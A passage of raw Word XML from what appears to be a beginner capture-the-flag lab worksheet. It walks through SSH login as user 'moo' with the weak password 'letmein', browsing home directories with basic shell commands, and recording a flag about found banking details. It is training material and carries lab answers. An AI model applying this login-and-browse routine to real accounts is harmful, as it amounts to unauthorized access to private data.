          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t 4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ec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he p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word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f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or m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o:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="8640"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>mo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-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808080"/>
          <w:spacing w:val="1"/>
          <w:position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808080"/>
          <w:position w:val="-1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color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ord: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0017251C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>letmein</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Log in to SSH as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 xml:space="preserve"> m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oo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In 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erm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l,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v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SS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H:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ssh moo@&lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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If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ompt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ntici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y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of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e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n’t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li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, en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er yes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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When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mp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, enter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o’s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swo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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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If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y,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v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igate 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mo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'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ho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e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cto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y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pwd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cd /home/moo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Capture the </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ch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mo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’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ile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or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ny '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nk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ng'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or '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ce'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pacing w:val="-4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ecto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ies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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C67B0D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ls, cd, cat, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-3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C67B0D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">less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 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v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igate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spect fi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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="412" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="7702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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cat &lt;filename&gt; less &lt;filename&gt; cd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="1" w:line="414" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="889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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cd .. (etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1800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#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Note to self: do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’t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4"/>
          <w:szCs w:val="24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binary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files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again. re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et is your frie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d.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1440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404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. When</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ou fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he fil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, read i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t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1"/>
          <w:position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position w:val="-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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ontents to reveal the flag, and re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ord</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="17" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007E35E5" w:rsidRPr="007E35E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>moo_banking_details_found</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-54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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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R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 xml:space="preserve">ad </w:t>
      </w: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t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 xml:space="preserve">he Clue to </w:t>
      </w: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t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he N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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>x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 xml:space="preserve">t </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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 xml:space="preserve">c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37"/>
          <w:position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Copy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> t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he c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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 xml:space="preserve">ue </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-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2"/>
          <w:position w:val="-1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nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position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in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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1"/>
          <w:position w:val="-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2"/>
          <w:position w:val="-1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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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pacing w:val="-1"/>
          <w:position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pacing w:val="-2"/>
          <w:position w:val="-1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cto</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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y or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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position w:val="-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 xml:space="preserve">ile. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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-3"/>
          <w:position w:val="-1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1"/>
          <w:position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wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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 xml:space="preserve">l </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g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ui</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-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e y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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ur next s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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3"/>
          <w:position w:val="-1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s:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
